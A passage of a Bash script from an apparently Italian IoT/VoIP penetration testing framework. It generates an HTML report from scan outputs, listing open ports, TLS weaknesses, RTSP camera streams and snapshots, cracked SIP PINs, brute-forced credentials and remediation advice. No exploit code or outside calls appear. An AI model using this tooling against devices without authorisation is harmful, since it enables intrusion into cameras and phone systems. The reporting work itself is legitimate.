.port-open{color:#56d364;font-weight:700}
pre{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:11px;white-space:pre-wrap;word-break:break-all;font-family:monospace;font-size:.78em;margin:8px 0;max-height:300px;overflow-y:auto}
.rec{background:#0c1a3d;border-left:4px solid #58a6ff;padding:9px 13px;border-radius:0 4px 4px 0;margin:8px 0;font-size:.85em}
.info-box{background:#14532d22;border-left:4px solid #56d364;padding:9px 13px;border-radius:0 4px 4px 0;margin:8px 0;font-size:.85em}
.footer{margin-top:24px;padding-top:10px;border-top:1px solid #21262d;color:#8b949e;font-size:.75em;display:flex;justify-content:space-between}
.cvss{font-family:monospace;font-weight:700;font-size:.85em}
.tag{display:inline-block;background:#21262d;color:#8b949e;padding:1px 6px;border-radius:10px;font-size:.75em;margin:1px}
</style>
</head>
<body>
HTMLEOF

        # COVER PAGE
        echo "<div class='cover'>"
        echo "  <div class='cover-logo'>EXA-DUNE</div>"
        echo "  <div class='cover-tool'>IoT &amp; VoIP Penetration Testing Framework v${VERSION}</div>"
        echo "  <div class='cover-divider'></div>"
        echo "  <div class='cover-type'>Penetration Test Report</div>"
        echo "  <div class='cover-target'>$(echo "$target" | sed 's/</\&lt;/g;s/>/\&gt;/g')</div>"
        echo "  <div class='cover-meta'>Data: $(date '+%d/%m/%Y %H:%M')</div>"
        echo "  <div class='cover-meta'>Directory: $(echo "$outdir" | sed 's/</\&lt;/g;s/>/\&gt;/g')</div>"
        echo "  <div class='cover-meta'>Piattaforma: $(uname -srm 2>/dev/null || echo 'Linux')</div>"
        echo "  <div class='confidential'>&#9888; CONFIDENZIALE &#9888;</div>"
        echo "</div>"

        # 1. EXECUTIVE SUMMARY
        echo "<h1>1. Executive Summary</h1>"
        echo "<p>Assessment automatizzato eseguito con <strong>exa-dune v${VERSION}</strong> sul target <strong>$(echo "$target" | sed 's/</\&lt;/g;s/>/\&gt;/g')</strong> in data $(date '+%d/%m/%Y').</p>"
        # Sommario Esecutivo narrativo
        _exec_summary_narrative "$target" "$n_critical" "$n_high" "$n_medium" "$n_low" "$outdir"
        echo "<p>Totale finding rilevati: <strong>$n_total</strong></p>"

        echo "<div class='exec-grid'>"
        echo "  <div class='stat-box sc'><div class='stat-num'>$n_critical</div><div class='stat-lbl'>CRITICAL</div></div>"
        echo "  <div class='stat-box sh'><div class='stat-num'>$n_high</div><div class='stat-lbl'>HIGH</div></div>"
        echo "  <div class='stat-box sm'><div class='stat-num'>$n_medium</div><div class='stat-lbl'>MEDIUM</div></div>"
        echo "  <div class='stat-box sl'><div class='stat-num'>$n_low</div><div class='stat-lbl'>LOW</div></div>"
        echo "</div>"

        # Bar chart severity
        echo "<h2>Distribuzione per Severity</h2>"
        for sev_info in "CRITICAL:$n_critical:bar-c" "HIGH:$n_high:bar-h" "MEDIUM:$n_medium:bar-m" "LOW:$n_low:bar-l" "INFO:$n_info:bar-i"; do
            local sn="${sev_info%%:*}"
            local rest="${sev_info#*:}"
            local sv="${rest%%:*}"
            local sc="${rest##*:}"
            local pct=$(( sv * 100 / max_n ))
            echo "<div class='bar-row'><div class='bar-lbl'>$sn</div><div class='bar-out'><div class='bar-in $sc' style='width:${pct}%'></div></div><div class='bar-cnt'>$sv</div></div>"
        done

        # Rischio complessivo
        local risk_level="Basso" risk_color="#58a6ff"
        [[ $n_low -gt 0 ]]      && { risk_level="Basso";  risk_color="#58a6ff"; }
        [[ $n_medium -gt 0 ]]   && { risk_level="Medio";  risk_color="#e3b341"; }
        [[ $n_high -gt 0 ]]     && { risk_level="Alto";   risk_color="#f97316"; }
        [[ $n_critical -gt 0 ]] && { risk_level="Critico"; risk_color="#ff7b72"; }
        echo "<p style='margin-top:12px'>Livello di rischio complessivo: <strong style='color:${risk_color}'>${risk_level}</strong></p>"

        # 2. PORTE E SERVIZI
        echo "<h1>2. Porte e Servizi Rilevati</h1>"
        if [[ -n "$nmap_file" ]]; then
            echo "<table><tr><th>Porta</th><th>Protocollo</th><th>Stato</th><th>Servizio</th><th>Versione / Info</th></tr>"
            while IFS= read -r line; do
                echo "$line" | grep -qE "^[0-9]+/tcp.*open" || continue
                local port_proto state svc ver
                port_proto=$(echo "$line" | awk '{print $1}')
                state=$(echo "$line" | awk '{print $2}')
                svc=$(echo "$line" | awk '{print $3}')
                ver=$(echo "$line" | awk '{for(i=4;i<=NF;i++) printf $i" "; print ""}' | sed 's/</\&lt;/g;s/>/\&gt;/g' | head -c 120)
                local port="${port_proto%%/*}" proto="${port_proto##*/}"
                echo "<tr><td class='port-open'>$port</td><td>$proto</td><td><span style='color:#56d364'>$state</span></td><td class='port-service' style='color:#79c0ff'>$(echo "$svc" | sed 's/</\&lt;/g;s/>/\&gt;/g')</td><td>$ver</td></tr>"
            done < "$nmap_file"
            echo "</table>"
        else
            echo "<p>Nessun file nmap trovato nella directory di output.</p>"
        fi

        # 2b. UDP PORTS
        local udp_file
        udp_file=$(find "$outdir" -maxdepth 2 -name "nmap_udp.nmap" 2>/dev/null | head -1)
        if [[ -n "$udp_file" ]] && grep -qE "^[0-9]+/udp.*open" "$udp_file" 2>/dev/null; then
            echo "<h2>Porte UDP Aperte</h2>"
            echo "<table><tr><th>Porta</th><th>Stato</th><th>Servizio</th><th>Info</th></tr>"
            while IFS= read -r line; do
                echo "$line" | grep -qE "^[0-9]+/udp.*(open|open|filtered)" || continue
                local up us usvc uver
                up=$(echo "$line" | awk '{print $1}')
                us=$(echo "$line" | awk '{print $2}')
                usvc=$(echo "$line" | awk '{print $3}')
                uver=$(echo "$line" | awk '{for(i=4;i<=NF;i++) printf $i" "; print ""}' | sed 's/</\&lt;/g;s/>/\&gt;/g' | head -c 80)
                local uclr="#e3b341"; [[ "$us" == "open" ]] && uclr="#56d364"
                echo "<tr><td class='port-open'>${up%%/*}</td><td style='color:$uclr'>$us</td><td style='color:#79c0ff'>$usvc</td><td>$uver</td></tr>"
            done < "$udp_file"
            echo "</table>"
        fi

        # 2c. SSL/TLS ANALYSIS
        local sslscan_f cert_f ssl_nmap_f
        sslscan_f=$(find "$outdir" -name "sslscan.txt" 2>/dev/null | head -1)
        cert_f=$(find "$outdir" -name "cert_summary.txt" 2>/dev/null | head -1)
        ssl_nmap_f=$(find "$outdir" -name "ssl_nmap.txt" 2>/dev/null | head -1)
        if [[ -n "$sslscan_f" || -n "$cert_f" ]]; then
            echo "<h2>SSL/TLS Analysis</h2>"
            if [[ -n "$cert_f" && -s "$cert_f" ]]; then
                echo "<h3>Certificato</h3><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$cert_f" | head -20
                echo "</pre>"
            fi
            if [[ -n "$sslscan_f" && -s "$sslscan_f" ]]; then
                echo "<h3>Protocolli e Cipher Suites</h3>"
                echo "<table><tr><th>Protocollo</th><th>Stato</th></tr>"
                grep -E "(SSL|TLS)v[0-9]" "$sslscan_f" 2>/dev/null | while IFS= read -r sline; do
                    local proto stat pcolor
                    proto=$(echo "$sline" | awk '{print $1}')
                    stat=$(echo "$sline" | awk '{print $2}')
                    pcolor="#56d364"; [[ "$stat" == "enabled" ]] && [[ "$proto" =~ SSL|TLSv1\.0|TLSv1\.1 ]] && pcolor="#ff7b72"
                    echo "<tr><td style='font-family:monospace'>$proto</td><td style='color:$pcolor'>$stat</td></tr>"
                done
                echo "</table>"
                echo "<h3>Cipher Suites Accettate</h3><pre>"
                grep -E "^(Preferred|Accepted)" "$sslscan_f" 2>/dev/null | sed 's/</\&lt;/g;s/>/\&gt;/g' | head -20
                echo "</pre>"
                # Heartbleed check
                local hb; hb=$(grep -i "heartbleed" "$sslscan_f" 2>/dev/null || true)
                [[ -n "$hb" ]] && { echo "<div class='info-box'><strong>Heartbleed:</strong> $(echo "$hb" | sed 's/</\&lt;/g;s/>/\&gt;/g')</div>"; }
            fi
        fi

        # 2d. ARP / HOST INFO
        local arp_f; arp_f=$(find "$outdir" -name "arp.txt" 2>/dev/null | head -1)
        if [[ -n "$arp_f" && -s "$arp_f" ]]; then
            echo "<h2>ARP / Informazioni Host</h2><pre>"
            sed 's/</\&lt;/g;s/>/\&gt;/g' "$arp_f" | head -10
            echo "</pre>"
        fi

        # 2e. SEARCHSPLOIT
        local sploit_f; sploit_f=$(find "$outdir" -name "searchsploit.txt" 2>/dev/null | head -1)
        if [[ -n "$sploit_f" && -s "$sploit_f" ]]; then
            echo "<h2>Searchsploit — Exploit Noti</h2>"
            echo "<table><tr><th>Titolo Exploit</th><th>Path</th></tr>"
            local ss_count=0
            while IFS= read -r ssline; do
                [[ "$ssline" =~ ^(-+|Exploit|$) ]] && continue
                ((ss_count++)) || true; [[ $ss_count -gt 25 ]] && break
                # Strip ANSI color codes
                local ssclean; ssclean=$(echo "$ssline" | sed 's/\x1b\[[0-9;]*m//g')
                local sstitle ssfile
                sstitle=$(echo "$ssclean" | sed 's/ | .*//' | sed 's/^[[:space:]]*//' | sed 's/</\&lt;/g;s/>/\&gt;/g')
                ssfile=$(echo "$ssclean" | sed 's/.*| //' | sed 's/^[[:space:]]*//' | sed 's/</\&lt;/g')
                [[ -z "$sstitle" || -z "$ssfile" ]] && continue
                echo "<tr><td>$sstitle</td><td><code>$ssfile</code></td></tr>"
            done < "$sploit_f"
            echo "</table>"
        fi

        # Snapshot RTSP se presenti
        local snap_files
        snap_files=$(find "$outdir" -name "snapshot_*.jpg" 2>/dev/null | head -3)
        if [[ -n "$snap_files" ]]; then
            echo "<h2>Snapshot RTSP</h2>"
            while IFS= read -r snap; do
                local snap_b64; snap_b64=$(base64 -w0 "$snap" 2>/dev/null || true)
                [[ -n "$snap_b64" ]] && echo "<img src='data:image/jpeg;base64,${snap_b64}' style='max-width:100%;border:1px solid #30363d;border-radius:4px;margin:6px 0'>"
            done <<< "$snap_files"
        fi

        # 3. FINDINGS DETTAGLIATI
        echo "<h1 class='page-break'>3. Findings Dettagliati</h1>"
        echo "<table><tr><th style='width:90px'>Severity</th><th style='width:80px'>CVSS 3.1</th><th style='width:80px'>Modulo</th><th>Descrizione</th><th style='width:140px'>ATT&amp;CK</th><th style='width:130px'>OWASP IoT</th></tr>"
        local has_findings=0
        while IFS= read -r -d '' ffile; do
            local module; module=$(basename "$(dirname "$ffile")")
            [[ "$module" == "$(basename "$outdir")" ]] && module="root"
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                # Filtra rumore nmap e righe header
                echo "$line" | grep -qP '^\s*[\|#=]|^Nmap|^Starting|^Host is' && continue
                local sev; sev=$(echo "$line" | grep -oP '^\[([A-Z]+)\]' | tr -d '[]')
                [[ -z "$sev" ]] && sev="INFO"
                local msg; msg=$(echo "$line" | sed 's/^\[[A-Z]*\] //' | sed 's/</\&lt;/g;s/>/\&gt;/g')
                local cvss_score
                case "$sev" in
                    CRITICAL) cvss_score="9.0 – 10.0" ;;
                    HIGH)     cvss_score="7.0 – 8.9" ;;
                    MEDIUM)   cvss_score="4.0 – 6.9" ;;
                    LOW)      cvss_score="0.1 – 3.9" ;;
                    *)        cvss_score="—" ;;
                esac
                local attck_tech; attck_tech=$(_attck_map "$line" | sed 's/</\&lt;/g;s/>/\&gt;/g')
                local owasp_cat; owasp_cat=$(_owasp_iot_map "$line" | sed 's/</\&lt;/g;s/>/\&gt;/g')
                echo "<tr><td><span class='sev sev-${sev}'>$sev</span></td><td><span class='cvss'>$cvss_score</span></td><td><span class='tag'>$module</span></td><td>$msg</td><td><span class='tag' style='font-size:.72em'>$attck_tech</span></td><td><span class='tag' style='font-size:.72em'>$owasp_cat</span></td></tr>"
                has_findings=1
            done < "$ffile"
        done < <(find "$outdir" -name "findings.txt" -print0 2>/dev/null | sort -z)
        [[ $has_findings -eq 0 ]] && echo "<tr><td colspan='6'>Nessun finding registrato.</td></tr>"
        echo "</table>"

        # 4. WEB APPLICATION
        local has_web=0
        if find "$outdir" -name "gobuster.txt" -o -name "nuclei.txt" -o -name "nikto.txt" 2>/dev/null | grep -q .; then
            has_web=1
            echo "<h1>4. Web Application</h1>"

            # Gobuster
            while IFS= read -r -d '' f; do
                local mod; mod=$(basename "$(dirname "$f")")
                if [[ -s "$f" ]]; then
                    echo "<h2>Directory/File Trovati — $mod</h2>"
                    echo "<table><tr><th>Path</th><th>Status</th><th>Dimensione</th></tr>"
                    local gcount=0
                    while IFS= read -r gline; do
                        [[ -z "$gline" || "$gline" == "="* ]] && continue
                        ((gcount++)) || true; [[ $gcount -gt 30 ]] && break
                        local gpath gstatus gsize
                        gpath=$(echo "$gline" | awk '{print $1}' | sed 's/</\&lt;/g;s/>/\&gt;/g')
                        gstatus=$(echo "$gline" | grep -oP '\(Status: \K[0-9]+' || echo "—")
                        gsize=$(echo "$gline" | grep -oP '\[Size: \K[0-9]+' || echo "—")
                        local sc=""; [[ "$gstatus" == "200" ]] && sc="color:#56d364;font-weight:bold"
                        echo "<tr><td><code>$gpath</code></td><td style='$sc'>$gstatus</td><td>${gsize}B</td></tr>"
                    done < "$f"
                    echo "</table>"
                fi
            done < <(find "$outdir" -name "gobuster.txt" -print0 2>/dev/null)

            # Nuclei
            while IFS= read -r -d '' f; do
                if [[ -s "$f" ]]; then
                    echo "<h2>Nuclei — Vulnerabilità Web</h2>"
                    echo "<table><tr><th>Template</th><th>Tipo</th><th>Severity</th><th>Host</th></tr>"
                    while IFS= read -r nline; do
                        [[ -z "$nline" ]] && continue
                        local tpl stype ssev shost
                        tpl=$(echo "$nline" | grep -oP '^\[[^\]]+\]' | head -1 | tr -d '[]' | sed 's/</\&lt;/g')
                        stype=$(echo "$nline" | grep -oP '^\[[^\]]+\] \[\K[^\]]+' | sed 's/</\&lt;/g')
                        ssev=$(echo "$nline" | grep -oP '\] \[([a-z]+)\]' | tail -1 | tr -d '[] ' | sed 's/</\&lt;/g')
                        shost=$(echo "$nline" | awk '{print $NF}' | sed 's/</\&lt;/g;s/>/\&gt;/g')
                        local sev_uc; sev_uc=$(echo "$ssev" | tr '[:lower:]' '[:upper:]')
                        echo "<tr><td><code>$tpl</code></td><td>$stype</td><td><span class='sev sev-${sev_uc:-INFO}'>$ssev</span></td><td>$shost</td></tr>"
                    done < "$f"
                    echo "</table>"
                fi
            done < <(find "$outdir" -name "nuclei.txt" -print0 2>/dev/null)
        fi

        # 4b. RTSP STREAMS
        local rtsp_nmap_f; rtsp_nmap_f=$(find "$outdir" -name "nmap_rtsp.txt" 2>/dev/null | head -1)
        local rtsp_streams_f; rtsp_streams_f=$(find "$outdir" -name "rtsp_streams.txt" 2>/dev/null | head -1)
        if [[ -n "$rtsp_nmap_f" && -s "$rtsp_nmap_f" ]] || [[ -n "$rtsp_streams_f" && -s "$rtsp_streams_f" ]]; then
            echo "<h1>4b. RTSP — Stream e Path Rilevati</h1>"
            # Paths da nmap rtsp-url-brute
            if [[ -n "$rtsp_nmap_f" ]]; then
                local rtsp_urls; rtsp_urls=$(grep -oP 'rtsp://[^\s<>"]+' "$rtsp_nmap_f" 2>/dev/null || true)
                if [[ -n "$rtsp_urls" ]]; then
                    echo "<table><tr><th>URL RTSP</th><th>Note</th></tr>"
                    while IFS= read -r rurl; do
                        [[ -z "$rurl" ]] && continue
                        local rnote="path rilevato da nmap rtsp-url-brute"
                        echo "$rurl" | grep -qi "reolink\|h264\|stream_1\|firststream" && rnote="<span style='color:#56d364'>path primario — probabile stream attivo</span>"
                        echo "<tr><td><code>$(echo "$rurl" | sed 's/</\&lt;/g;s/>/\&gt;/g')</code></td><td>$rnote</td></tr>"
                    done <<< "$rtsp_urls"
                    echo "</table>"
                fi
            fi
            # Metodi RTSP
            local rtsp_methods; rtsp_methods=$(grep -A5 "rtsp-methods" "$rtsp_nmap_f" 2>/dev/null | grep "Supported" || true)
            [[ -n "$rtsp_methods" ]] && echo "<p><strong>Metodi RTSP supportati:</strong> $(echo "$rtsp_methods" | sed 's/</\&lt;/g;s/>/\&gt;/g')</p>"
            # Streams trovati
            if [[ -n "$rtsp_streams_f" && -s "$rtsp_streams_f" ]]; then
                echo "<h3>Stream Verificati</h3><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$rtsp_streams_f" | head -30
                echo "</pre>"
            fi
            [[ -n "$(find "$outdir" -name "snapshot_*.jpg" 2>/dev/null | head -1)" ]] && {
                echo "<h3>Snapshot RTSP</h3>"
                while IFS= read -r snap; do
                    local snap_b64; snap_b64=$(base64 -w0 "$snap" 2>/dev/null || true)
                    [[ -n "$snap_b64" ]] && echo "<img src='data:image/jpeg;base64,${snap_b64}' style='max-width:100%;border:1px solid #30363d;border-radius:4px;margin:6px 0;max-height:240px'>"
                done < <(find "$outdir" -name "snapshot_*.jpg" 2>/dev/null | head -3)
            }
        fi

        # 4c. SIP EXTENSIONS E VoIP
        local sip_ext_f; sip_ext_f=$(find "$outdir" -name "sip_extensions.txt" 2>/dev/null | head -1)
        local sip_crack_f; sip_crack_f=$(find "$outdir" -name "sip_crack*.txt" 2>/dev/null | head -1)
        local svmap_f; svmap_f=$(find "$outdir" -name "svmap.txt" 2>/dev/null | head -1)
        if [[ -n "$sip_ext_f" || -n "$svmap_f" ]]; then
            echo "<h1>4c. SIP / VoIP</h1>"
            if [[ -n "$svmap_f" && -s "$svmap_f" ]]; then
                echo "<h2>SIP Server Rilevati</h2><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$svmap_f" | head -20
                echo "</pre>"
            fi
            if [[ -n "$sip_ext_f" && -s "$sip_ext_f" ]]; then
                echo "<h2>Extension SIP Trovate</h2>"
                echo "<table><tr><th>Extension</th><th>Stato</th></tr>"
                local sip_count=0
                while IFS= read -r ext; do
                    [[ -z "$ext" ]] && continue
                    ((sip_count++)) || true; [[ $sip_count -gt 50 ]] && break
                    echo "<tr><td><code>$ext</code></td><td><span style='color:#e3b341'>trovata</span></td></tr>"
                done < "$sip_ext_f"
                echo "</table>"
            else
                echo "<p style='color:#8b949e'>Nessuna extension SIP trovata.</p>"
            fi
            if [[ -n "$sip_crack_f" && -s "$sip_crack_f" ]]; then
                echo "<h2>SIP PIN Cracking</h2><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$sip_crack_f" | head -20
                echo "</pre>"
            fi
        fi

        # 4d. JavaScript Analysis
        local js_secrets_f; js_secrets_f=$(find "$outdir" -name "js_debug_comments.txt" 2>/dev/null | head -1)
        local js_endpoints_f; js_endpoints_f=$(find "$outdir" -name "js_endpoints.txt" 2>/dev/null | head -1)
        local js_versions_f; js_versions_f=$(find "$outdir" -name "js_versions.txt" 2>/dev/null | head -1)
        local js_emails_f; js_emails_f=$(find "$outdir" -name "js_emails.txt" 2>/dev/null | head -1)
        if [[ -n "$js_secrets_f" || -n "$js_endpoints_f" ]]; then
            echo "<h1>4d. Analisi JavaScript</h1>"
            if [[ -n "$js_endpoints_f" && -s "$js_endpoints_f" ]]; then
                echo "<h2>Endpoint / API Rilevati</h2>"
                echo "<table><tr><th>Endpoint</th></tr>"
                local ep_count=0
                while IFS= read -r ep; do
                    [[ -z "$ep" ]] && continue
                    ((ep_count++)) || true; [[ $ep_count -gt 30 ]] && break
                    echo "<tr><td><code>$(echo "$ep" | sed 's/</\&lt;/g;s/>/\&gt;/g')</code></td></tr>"
                done < "$js_endpoints_f"
                echo "</table>"
            fi
            if [[ -n "$js_secrets_f" && -s "$js_secrets_f" ]]; then
                echo "<h2>Segreti / Token Hardcoded</h2><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$js_secrets_f" | head -30
                echo "</pre>"
            fi
            if [[ -n "$js_versions_f" && -s "$js_versions_f" ]]; then
                echo "<h2>Librerie JS Rilevate</h2><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$js_versions_f" | head -20
                echo "</pre>"
            fi
            if [[ -n "$js_emails_f" && -s "$js_emails_f" ]]; then
                echo "<h2>Email Trovate</h2><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$js_emails_f" | head -10
                echo "</pre>"
            fi
        fi

        # 4e. SSH / FTP / Telnet details
        local ssh_ver_f; ssh_ver_f=$(find "$outdir" -name "ssh_version.txt" 2>/dev/null | head -1)
        local ssh_timing_f; ssh_timing_f=$(find "$outdir" -name "ssh_user_timing.txt" 2>/dev/null | head -1)
        local ftp_nmap_f; ftp_nmap_f=$(find "$outdir" -name "nmap_ftp.txt" 2>/dev/null | head -1)
        if [[ -n "$ssh_ver_f" || -n "$ftp_nmap_f" ]]; then
            echo "<h1>4e. Servizi di Accesso Remoto</h1>"
            if [[ -n "$ssh_ver_f" && -s "$ssh_ver_f" ]]; then
                echo "<h2>SSH</h2><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$ssh_ver_f" | head -15
                echo "</pre>"
                if [[ -n "$ssh_timing_f" && -s "$ssh_timing_f" ]]; then
                    echo "<h3>User Enumeration (Timing)</h3><pre>"
                    sed 's/</\&lt;/g;s/>/\&gt;/g' "$ssh_timing_f" | head -20
                    echo "</pre>"
                fi
            fi
            if [[ -n "$ftp_nmap_f" && -s "$ftp_nmap_f" ]]; then
                echo "<h2>FTP</h2><pre>"
                sed 's/</\&lt;/g;s/>/\&gt;/g' "$ftp_nmap_f" | head -20
                echo "</pre>"
            fi
        fi

        # 5. CREDENZIALI TROVATE
        echo "<h1>5. Credenziali Trovate</h1>"
        local has_creds=0
        echo "<table><tr><th>Modulo</th><th>Servizio</th><th>Credenziale</th></tr>"
        while IFS= read -r -d '' hfile; do
            local hmod; hmod=$(basename "$(dirname "$hfile")")
            while IFS= read -r hline; do
                [[ "$hline" == *"login:"* ]] || continue
                local hcred; hcred=$(echo "$hline" | sed 's/</\&lt;/g;s/>/\&gt;/g')
                echo "<tr><td><span class='tag'>$hmod</span></td><td>hydra</td><td><code>$hcred</code></td></tr>"
                has_creds=1
            done < "$hfile"
        done < <(find "$outdir" -name "hydra_*.txt" -print0 2>/dev/null)
        # Creds RTSP/ONVIF
        while IFS= read -r -d '' cf; do
            local cmod; cmod=$(basename "$(dirname "$cf")")
            while IFS= read -r cline; do
                [[ -z "$cline" ]] && continue
                echo "<tr><td><span class='tag'>$cmod</span></td><td>digest/onvif</td><td><code>$(echo "$cline" | sed 's/</\&lt;/g')</code></td></tr>"
                has_creds=1
            done < "$cf"
        done < <(find "$outdir" \( -name "rtsp_digest_creds.txt" -o -name "onvif_creds.txt" \) -print0 2>/dev/null)
        # Creds da credential store JSON
        local creds_json_f; creds_json_f=$(find "$outdir" -maxdepth 2 -name "creds.json" 2>/dev/null | head -1)
        if [[ -n "$creds_json_f" && -f "$creds_json_f" ]]; then
            export CRED_FILE="$creds_json_f"
            python3 - <<'PYEOF' 2>/dev/null | while IFS='|' read -r svc host port user pass src; do
import json, os
f = os.environ['CRED_FILE']
with open(f) as fh:
    d = json.load(fh)
for c in d['credentials']:
    print(f"{c['service']}|{c['host']}|{c['port']}|{c['user']}|{c['pass']}|{c['source']}")
PYEOF
                echo "<tr><td><span class='tag'>$src</span></td><td>${svc}:${port}</td><td><code>${user}:${pass} @ ${host}</code></td></tr>"
                has_creds=1
            done || true
            unset CRED_FILE
        fi
        [[ $has_creds -eq 0 ]] && echo "<tr><td colspan='3'>Nessuna credenziale trovata.</td></tr>"
        echo "</table>"

        # 5b. CVE ENRICHMENT
        local _cve_list; _cve_list=$(find "$outdir" -name "findings.txt" -exec grep -hoP 'CVE-[0-9]{4}-[0-9]+' {} \; 2>/dev/null | sort -u)
        if [[ -n "$_cve_list" ]]; then
            echo "<h1>5b. CVE Enrichment (NVD)</h1>"
            echo "<table><tr><th>CVE ID</th><th>CVSS Score</th></tr>"
            while IFS= read -r _cid; do
                [[ -z "$_cid" ]] && continue
                local _cscore; _cscore=$(_cvss_lookup "$_cid")
                echo "<tr><td><code>$_cid</code></td><td><span class='cvss'>$_cscore</span></td></tr>"
            done <<< "$_cve_list"
            echo "</table>"
        fi

        # 5c. IEC 62443 COMPLIANCE
        echo "<h1>5c. IEC 62443 — Industrial Cybersecurity</h1>"
        echo "<table><tr><th>Livello</th><th>Requisito</th><th>Stato</th><th>Dettaglio</th></tr>"
        local _htel _hsnmp _hhttps _hcred
        _htel=$(find "$outdir" -name "findings.txt" -exec grep -li "telnet" {} \; 2>/dev/null | head -1)
        _hsnmp=$(find "$outdir" -name "findings.txt" -exec grep -li "snmp" {} \; 2>/dev/null | head -1)
        _hhttps=$(find "$outdir" -name "findings.txt" -exec grep -li "https\|tls\|ssl" {} \; 2>/dev/null | head -1)
        _hcred=$(find "$outdir" -name "findings.txt" -exec grep -li "default\|credential\|brute" {} \; 2>/dev/null | head -1)
        local _pass="<span style='color:#56d364'>✓ PASS</span>"
        local _fail="<span style='color:#ff7b72'>✗ FAIL</span>"
        [[ -n "$_htel" ]]   && echo "<tr><td>SL-1</td><td>4.3.3.5.2 — No unencrypted protocols</td><td>$_fail</td><td>Telnet rilevato</td></tr>" \
                           || echo "<tr><td>SL-1</td><td>4.3.3.5.2 — No unencrypted protocols</td><td>$_pass</td><td>Telnet non rilevato</td></tr>"
        [[ -n "$_hsnmp" ]]  && echo "<tr><td>SL-1</td><td>4.3.3.3.3 — Secure protocols</td><td>$_fail</td><td>SNMP v1/v2c rilevato</td></tr>" \
                           || echo "<tr><td>SL-1</td><td>4.3.3.3.3 — Secure protocols</td><td>$_pass</td><td>SNMP v1/v2c non rilevato</td></tr>"
        [[ -n "$_hhttps" ]] && echo "<tr><td>SL-1</td><td>HTTPS/TLS</td><td>$_pass</td><td>HTTPS/TLS rilevato</td></tr>" \
                           || echo "<tr><td>SL-1</td><td>HTTPS/TLS</td><td>$_fail</td><td>HTTPS/TLS non rilevato</td></tr>"
        [[ -n "$_hcred" ]]  && echo "<tr><td>SL-2</td><td>4.3.3.7.2 — Credenziali sicure</td><td>$_fail</td><td>Credenziali di default trovate</td></tr>" \
                           || echo "<tr><td>SL-2</td><td>4.3.3.7.2 — Credenziali sicure</td><td>$_pass</td><td>Nessuna credenziale di default</td></tr>"
        echo "</table>"

        # 6. RACCOMANDAZIONI
        echo "<h1>6. Raccomandazioni</h1>"
        [[ $n_critical -gt 0 ]] && cat << 'RECS'
<div class='rec'><strong>🔴 CRITICAL</strong> — Vulnerabilità critiche rilevate. Intervento immediato richiesto: isolare il dispositivo dalla rete, applicare patch firmware, cambiare tutte le credenziali predefinite.</div>
RECS
        [[ $n_high -gt 0 ]] && cat << 'RECS'
<div class='rec'><strong>🟠 HIGH</strong> — Vulnerabilità ad alto rischio. Pianificare remediation entro 7 giorni: aggiornare firmware, disabilitare servizi non necessari, implementare firewall rules.</div>
RECS
        [[ $n_medium -gt 0 ]] && cat << 'RECS'
<div class='rec'><strong>🟡 MEDIUM</strong> — Vulnerabilità a medio rischio. Pianificare remediation entro 30 giorni: rafforzare configurazione TLS, abilitare autenticazione a due fattori dove possibile.</div>
RECS
        local has_rtsp
        has_rtsp=$(find "$outdir" -name "rtsp_streams.txt" -not -empty 2>/dev/null | head -1)
        [[ -n "$has_rtsp" ]] && cat << 'RECS'
<div class='rec'><strong>📹 RTSP</strong> — Stream RTSP rilevati. Verificare che l'accesso richieda autenticazione Digest. Limitare accesso RTSP a IP autorizzati tramite firewall.</div>
RECS
        # Raccomandazione ONVIF se presente
        [[ -n "$(find "$outdir" -name "onvif_creds.txt" -not -empty 2>/dev/null)" ]] && cat << 'RECS'
<div class='rec'><strong>📷 ONVIF</strong> — Credenziali ONVIF trovate. Cambiare immediatamente la password, abilitare HTTPS e limitare l'accesso al servizio ONVIF/gSOAP via firewall.</div>
RECS
        # Raccomandazione SNMP se community trovata
        [[ -n "$(find "$outdir" -name "snmp_found.txt" -not -empty 2>/dev/null)" ]] && cat << 'RECS'
<div class='rec'><strong>📡 SNMP</strong> — Community SNMP trovata. Aggiornare a SNMPv3 con autenticazione e cifratura, o disabilitare SNMP se non necessario.</div>
RECS
        # Raccomandazione TLS debole
        if find "$outdir" -name "sslscan.txt" 2>/dev/null | xargs grep -l "TLSv1\.0.*enabled\|SSLv[23].*enabled" 2>/dev/null | grep -q .; then
            cat << 'RECS'
<div class='rec'><strong>🔐 TLS</strong> — Protocolli TLS obsoleti (TLSv1.0/SSLv2/SSLv3) rilevati. Disabilitare i protocolli vulnerabili e configurare solo TLSv1.2+.</div>
RECS
        fi
        cat << 'RECS'
<div class='info-box'><strong>✅ Buone pratiche generali:</strong> Aggiornare regolarmente il firmware, utilizzare password complesse e uniche per ogni dispositivo, segmentare la rete IoT in VLAN dedicata, monitorare i log di accesso, disabilitare tutti i servizi non necessari.</div>
RECS

        # 7. MODULI ESEGUITI
        echo "<h1>7. Moduli Eseguiti</h1>"
        echo "<table><tr><th>Modulo</th><th>File Output</th><th>Findings</th><th>Stato</th></tr>"
        find "$outdir" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort | while IFS= read -r d; do
            local mod; mod=$(basename "$d")
            local fcount; fcount=$(find "$d" -type f 2>/dev/null | wc -l)
            local fnd; fnd=$(find "$d" -name "findings.txt" -exec wc -l {} \; 2>/dev/null | awk '{print $1+0}')
            local status="<span style='color:#56d364'>✓ Completato</span>"
            [[ $fcount -eq 0 ]] && status="<span style='color:#8b949e'>— Vuoto</span>"
            local fnd_disp="—"; [[ -n "$fnd" && "$fnd" -gt 0 ]] && fnd_disp="<span style='color:#e3b341'>$fnd</span>"
            echo "<tr><td><strong>$mod</strong></td><td>$fcount file</td><td>$fnd_disp</td><td>$status</td></tr>"
        done
        echo "</table>"

        # 8. TIMELINE
        echo "<h1>8. Timeline delle Fasi</h1>"
        local timeline_f; timeline_f=$(find "$outdir" -name "timeline.txt" 2>/dev/null | head -1)
        if [[ -n "$timeline_f" && -s "$timeline_f" ]]; then
            echo "<table><tr><th style='width:90px'>Orario</th><th>Evento</th></tr>"
            while IFS= read -r tline; do
                [[ -z "$tline" ]] && continue
                local ttime tmsg
